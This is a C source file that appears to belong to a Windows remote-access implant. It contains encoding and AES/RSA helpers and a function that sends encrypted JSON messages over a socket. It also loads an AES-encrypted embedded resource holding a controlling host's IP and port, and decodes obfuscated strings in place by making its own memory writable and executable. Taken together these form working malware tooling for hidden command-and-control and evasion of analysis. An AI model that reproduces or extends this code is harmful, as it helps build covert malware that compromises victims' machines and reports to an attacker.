#include "utils.h"
#include "config.h"
#include "cJSON.h"
#include <wincrypt.h>
#include <bcrypt.h>
#include <ctype.h>
#include <stdint.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len)) return NULL;
    char* out = (char*)malloc(out_len);
    if (!out) return NULL;
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &out_len)) { free(out); return NULL; }
    if (output_length) *output_length = (size_t)out_len;
    return out;
}

unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) return NULL;
    unsigned char* out = (unsigned char*)malloc(out_len);
    if (!out) return NULL;
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, out, &out_len, NULL, NULL)) { free(out); return NULL; }
    if (output_length) *output_length = (size_t)out_len;
    return out;
}

char* str_replace(const char* orig, const char* rep, const char* with) {
    char *result, *ins, *tmp;
    int len_rep, len_with, len_front, count;
    if (!orig || !rep) return NULL;
    len_rep = (int)strlen(rep); if (len_rep == 0) return NULL;
    if (!with) with = "";
    len_with = (int)strlen(with);
    ins = (char*)orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) ins = tmp + len_rep;
    tmp = result = (char*)malloc(strlen(orig) + (len_with - len_rep) * count + 1);
    if (!result) return NULL;
    while (count--) {
        ins = strstr(orig, rep); len_front = (int)(ins - orig);
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep;
    }
    strcpy(tmp, orig); return result;
}

void str_trim(char* s) {
    char* p = s; int l = (int)strlen(p);
    while (l > 0 && isspace((unsigned char)p[l - 1])) p[--l] = 0;
    while (*p && isspace((unsigned char)*p)) ++p, --l;
    memmove(s, p, (size_t)l + 1);
}

extern SessionKey g_session;

void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
    sock_send_ex(sock, mutex, "response", msg);
}

void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
    if (mutex) WaitForSingleObject(mutex, INFINITE);
    cJSON *root = cJSON_CreateObject();
    if (!root) { if (mutex) ReleaseMutex(mutex); return; }
    cJSON_AddStringToObject(root, "type", type);
    cJSON_AddStringToObject(root, "payload", (msg && strlen(msg) > 0) ? msg : " ");
    char *json_msg = cJSON_PrintUnformatted(root);
    if (!json_msg) { cJSON_Delete(root); if (mutex) ReleaseMutex(mutex); return; }
    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, (size_t)strlen(json_msg), g_session.key, g_session.iv);
    if (!encrypted) { free(json_msg); cJSON_Delete(root); if (mutex) ReleaseMutex(mutex); return; }
    cJSON *packet = cJSON_CreateObject();
    if (packet) {
        cJSON_AddStringToObject(packet, "data", encrypted);
        char *iv_b64 = base64_encode(g_session.iv, 16, NULL);
        if (iv_b64) {
            cJSON_AddStringToObject(packet, "iv", iv_b64);
            char *final_json = cJSON_PrintUnformatted(packet);
            if (final_json) {
                size_t l = strlen(final_json);
                char *buf = (char*)malloc(l + 2);
                if (buf) { memcpy(buf, final_json, l); buf[l] = '\n'; buf[l+1] = 0; send(sock, buf, (int)(l + 1), 0); free(buf); }
                free(final_json);
            }
            free(iv_b64);
        }
        cJSON_Delete(packet);
    }
    free(encrypted); free(json_msg); cJSON_Delete(root);
    if (mutex) ReleaseMutex(mutex);
}

char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
    CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
    DWORD pubKeyInfoLen = 0, derLen = 0;
    HCRYPTPROV hProv = 0; HCRYPTKEY hRSAKey = 0;
    char* out = NULL;
    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = (BYTE*)malloc(derLen);
        if (der) {
            if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL)) {
                if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
                    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                        if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
                            DWORD encLen = 0;
                            if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
                                BYTE* encBuf = (BYTE*)malloc(encLen);
                                if (encBuf) {
                                    memcpy(encBuf, data, len); DWORD dataLen = (DWORD)len;
                                    if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
                                        for (DWORD i = 0; i < dataLen / 2; i++) { BYTE t = encBuf[i]; encBuf[i] = encBuf[dataLen - 1 - i]; encBuf[dataLen - 1 - i] = t; }
                                        out = base64_encode(encBuf, dataLen, NULL);
                                    }
                                    free(encBuf);
                                }
                            }
                            CryptDestroyKey(hRSAKey);
                        }
                        CryptReleaseContext(hProv, 0);
                    }
                    LocalFree(pubKeyInfo);
                }
            }
            free(der);
        }
    }
    return out;
}

char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0;
    PBYTE pbKeyObject = NULL, pbCipherText = NULL;
    char* out = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject); if (!pbKeyObject) goto cleanup;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
    pbCipherText = (PBYTE)malloc(cbCipherText); if (!pbCipherText) goto cleanup;
    memcpy(ivCopy, iv, 16);
    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
    out = base64_encode(pbCipherText, cbResult, NULL);
cleanup:
    if (pbCipherText) free(pbCipherText); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL;
    size_t cipherLen = 0;
    pbCipher = (PBYTE)base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
    if (!pbCipher) return NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject); if (!pbKeyObject) goto cleanup;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) goto cleanup;
    pbPlain = (unsigned char*)malloc(cbPlain + 1); if (!pbPlain) goto cleanup;
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) == 0) {
        if (out_len) *out_len = (size_t)cbResult;
    }
cleanup:
    if (pbCipher) free(pbCipher); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return pbPlain;
}

static int is_leap(unsigned long long y) { return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0); }
void get_formatted_time(unsigned long long secs, char* out_buf) {
    unsigned long long min = (secs % 3600) / 60, hr = (secs % 86400) / 3600, days = secs / 86400, yr = 1970;
    while (1) { unsigned long long diy = is_leap(yr) ? 366 : 365; if (days < diy) break; days -= diy; yr++; }
    unsigned long long mths[] = {31, is_leap(yr) ? 29u : 28u, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    unsigned long long mth = 1;
    for (int i = 0; i < 12; i++) { if (days < mths[i]) break; days -= mths[i]; mth++; }
    sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, mth, yr, hr, min);
}

char g_host[256] = {0}; int g_port = 0;
unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};

static int b16_val(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return -1;
}

size_t base16_decode(const char* in, unsigned char* out) {
    size_t len = strlen(in);
    for (size_t i = 0; i < len / 2; i++) {
        int v1 = b16_val(in[i * 2]), v2 = b16_val(in[i * 2 + 1]);
        if (v1 == -1 || v2 == -1) return 0;
        out[i] = (unsigned char)((v1 << 4) | v2);
    }
    return len / 2;
}

size_t base32_decode(const char* in, unsigned char* out) {
    unsigned char alpha[32];
    for(int i=0; i<26; i++) alpha[i] = 'A'+i;
    for(int i=0; i<6; i++) alpha[26+i] = '2'+i;
    int buffer = 0, bits = 0; size_t count = 0;
    for (size_t i = 0; in[i]; i++) {
        int val = -1; unsigned char c = (unsigned char)toupper((unsigned char)in[i]);
        for(int k=0; k<32; k++) if(alpha[k] == c) { val = k; break; }
        if (val == -1) continue;
        buffer = (buffer << 5) | val; bits += 5;
        if (bits >= 8) { out[count++] = (unsigned char)((buffer >> (bits - 8)) & 0xFF); bits -= 8; }
    }
    return count;
}

size_t base58_decode(const char* in, unsigned char* out) {
    unsigned char alpha[58];
    const char* s = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    memcpy(alpha, s, 58);
    size_t out_len = 0;
    for (size_t i = 0; in[i]; i++) {
        int val = -1; for(int k=0; k<58; k++) if(alpha[k] == (unsigned char)in[i]) { val = k; break; }
        if (val == -1) continue;
        int carry = val;
        for (size_t j = 0; j < out_len; j++) { carry += out[j] * 58; out[j] = (unsigned char)(carry & 0xFF); carry >>= 8; }
        while (carry) { out[out_len++] = (unsigned char)(carry & 0xFF); carry >>= 8; }
    }
    for (size_t i = 0; in[i] == '1'; i++) out[out_len++] = 0;
    for (size_t i = 0; i < out_len / 2; i++) { unsigned char tmp = out[i]; out[i] = out[out_len - 1 - i]; out[out_len - 1 - i] = tmp; }
    return out_len;
}

size_t base62_decode(const char* in, unsigned char* out) {
    unsigned char alpha[62];
    const char* s = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    memcpy(alpha, s, 62);
    size_t out_len = 0;
    for (size_t i = 0; in[i]; i++) {
        int val = -1; for(int k=0; k<62; k++) if(alpha[k] == (unsigned char)in[i]) { val = k; break; }
        if (val == -1) continue;
        int carry = val;
        for (size_t j = 0; j < out_len; j++) { carry += out[j] * 62; out[j] = (unsigned char)(carry & 0xFF); carry >>= 8; }
        while (carry) { out[out_len++] = (unsigned char)(carry & 0xFF); carry >>= 8; }
    }
    for (size_t i = 0; i < out_len / 2; i++) { unsigned char tmp = out[i]; out[i] = out[out_len - 1 - i]; out[out_len - 1 - i] = tmp; }
    return out_len;
}

size_t base85_decode(const char* in, size_t in_len, unsigned char* out) {
    size_t out_len = 0; uint64_t val = 0; int count = 0;
    for (size_t i = 0; i < in_len; i++) {
        unsigned char c = (unsigned char)in[i]; if (isspace(c)) continue;
        val = val * 85 + (uint64_t)(c - '!'); count++;
        if (count == 5) {
            out[out_len++] = (unsigned char)((val >> 24) & 0xFF); out[out_len++] = (unsigned char)((val >> 16) & 0xFF);
            out[out_len++] = (unsigned char)((val >> 8) & 0xFF); out[out_len++] = (unsigned char)(val & 0xFF);
            val = 0; count = 0;
        }
    }
    if (count > 0) {
        int rem = count - 1; for (int i = 0; i < 5 - count; i++) val = val * 85 + 84;
        for (int i = 0; i < rem; i++) out[out_len++] = (unsigned char)((val >> (24 - i * 8)) & 0xFF);
    }
    return out_len;
}

size_t base91_decode(const char* in, unsigned char* out) {
    unsigned char alpha[91];
    const char* s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";
    memcpy(alpha, s, 91);
    unsigned int v = (unsigned int)-1, b = 0, count = 0; size_t out_len = 0;
    for (size_t i = 0; in[i]; i++) {
        int val = -1; for(int k=0; k<91; k++) if(alpha[k] == (unsigned char)in[i]) { val = k; break; }
        if (val == -1) continue;
        if (v == (unsigned int)-1) v = (unsigned int)val;
        else {
            v += (unsigned int)val * 91; b |= v << count; count += (v & 8191) > 88 ? 13 : 14;
            do { out[out_len++] = (unsigned char)(b & 0xFF); b >>= 8; count -= 8; } while (count >= 8);
            v = (unsigned int)-1;
        }
    }
    return out_len;
}

void transparent_decryption() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;
    unsigned char marker[16]; SET_MARKER(marker);
    if (memcmp(pData, marker, 16) != 0) return;
    int num_strings = *(int*)(pData + 16 + 2032);
    if (num_strings <= 0) return;
    unsigned char* string_table = pData + 16 + 2032 + 4;
    unsigned char key = g_xor_key[4];
    if (key == 0) return;
    HMODULE hMod = GetModuleHandle(NULL);
    for (int i = 0; i < num_strings; i++) {
        unsigned char* entry = string_table + (i * 32);
        DWORD rva = *(DWORD*)(entry), orig_len = *(DWORD*)(entry + 4), res_offset = *(DWORD*)(entry + 8);
        int steps = *(int*)(entry + 12); unsigned char* step_types = entry + 16;
        if (rva == 0 || orig_len == 0 || orig_len > 65536) continue;
        unsigned char* addr = (unsigned char*)hMod + rva;
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                DWORD old_protect;
                if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
                    static unsigned char buf[65536];
                    unsigned char* encoded_data_start = pData + 16 + 2032 + res_offset;
                    DWORD enc_len = *(DWORD*)encoded_data_start;
                    if (enc_len > 65536) enc_len = 65536;
                    memcpy(buf, encoded_data_start + 4, (size_t)enc_len);
                    size_t cur_len = (size_t)enc_len;
                    int success = 1;
                    for (int s = steps - 1; s >= 0; s--) {
                        unsigned char type = step_types[s]; static unsigned char tmp[65536];
                        if (type == 0) { for (size_t k = 0; k < cur_len; k++) buf[k] ^= key; }
                        else if (type == 1) { size_t out_l; buf[cur_len] = 0; unsigned char* d = base64_decode((char*)buf, cur_len, &out_l); if (d) { if (out_l <= 65536) { memcpy(buf, d, out_l); cur_len = out_l; } else success = 0; free(d); } else success = 0; }
                        else if (type == 2) { buf[cur_len] = 0; cur_len = base32_decode((char*)buf, tmp); if (cur_len > 0) memcpy(buf, tmp, cur_len); else success = 0; }
                        else if (type == 3) { buf[cur_len] = 0; cur_len = base16_decode((char*)buf, tmp); if (cur_len > 0) memcpy(buf, tmp, cur_len); else success = 0; }
                        else if (type == 4) { buf[cur_len] = 0; cur_len = base58_decode((char*)buf, tmp); if (cur_len > 0) memcpy(buf, tmp, cur_len); else success = 0; }
                        else if (type == 5) { buf[cur_len] = 0; cur_len = base62_decode((char*)buf, tmp); if (cur_len > 0) memcpy(buf, tmp, cur_len); else success = 0; }
                        else if (type == 6) { cur_len = base85_decode((char*)buf, cur_len, tmp); if (cur_len > 0) memcpy(buf, tmp, cur_len); else success = 0; }
                        else if (type == 7) { buf[cur_len] = 0; cur_len = base91_decode((char*)buf, tmp); if (cur_len > 0) memcpy(buf, tmp, cur_len); else success = 0; }
                        if (!success) break;
                    }
                    if (success) memcpy(addr, buf, (size_t)orig_len);
                    VirtualProtect(addr, orig_len, old_protect, &old_protect);
                }
            }
        }
    }
}

void load_config_from_resource() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;
    unsigned char marker[16]; SET_MARKER(marker);
    if (memcmp(pData, marker, 16) != 0) return;
    unsigned char* encrypted_config = pData + 16;
    size_t config_len = 2032;
    unsigned char key[32], iv[16]; memcpy(key, CONFIG_KEY, 32); memcpy(iv, CONFIG_IV, 16);
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject); if (!pbKeyObject) goto cleanup;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) { cbPlain = (DWORD)config_len; }
    pbPlain = (unsigned char*)malloc(cbPlain + 1); if (!pbPlain) goto cleanup;
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
        pbPlain[cbResult] = 0;
        cJSON* root = cJSON_Parse((char*)pbPlain);
        if (root) {
            cJSON* ip = cJSON_GetObjectItem(root, "ip"); cJSON* port = cJSON_GetObjectItem(root, "port");
            if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
            if (port) g_port = port->valueint;
            cJSON_Delete(root);
        }
    }
cleanup:
    if (pbPlain) free(pbPlain); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}
